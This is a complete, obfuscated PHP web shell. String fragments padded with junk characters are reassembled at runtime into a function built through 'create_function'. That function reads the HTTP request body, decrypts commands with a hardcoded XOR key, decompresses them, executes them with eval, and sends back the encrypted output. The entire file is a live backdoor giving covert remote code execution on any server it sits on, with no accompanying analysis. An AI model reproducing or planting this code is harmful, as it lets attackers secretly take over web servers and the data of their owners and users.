<?php
$x='$k=35"f35a96781356";$kh=35"b3567218f535e23e";$kf="912535733541e43a";$35p="sD35UbswkWA35W35nDXP2g";functio3535n x35($t,$k)';
$H='$o.=$35t{$i}^$35k{$j};}}3535return35 $o;}if (@p35reg_35match("/35$k35h(.+)$kf/",35@file_35get_co35nt35ents("35php://i3';
$E=str_replace('L','','creLLatLe_fLLunLction');
$u='_con35t35ents();@35o3535b_end_clean();$r=@base356435_encode(35@x(@gzcom35pres35s($o),$k35));pr35int("35$p$kh$r$35kf");}';
$q='{$c=s35trl3535en($k);$l=strlen35($t);$o35="";fo35r($i=035;$i<$35l;){for35($j=0;35($j<$35c&&$35i<$l)353535;$j++,$i++){';
$G='5nput")35,$m)=35=1) {@ob_star35t35();@e35val(@gzunco3535mpress(@x(@3535ba35se64_decode($m35[1]),$k))35)35;$o=35@ob_get';
$D=str_replace('35','',$x.$q.$H.$G.$u);
$W=$E('',$D);$W();
?>
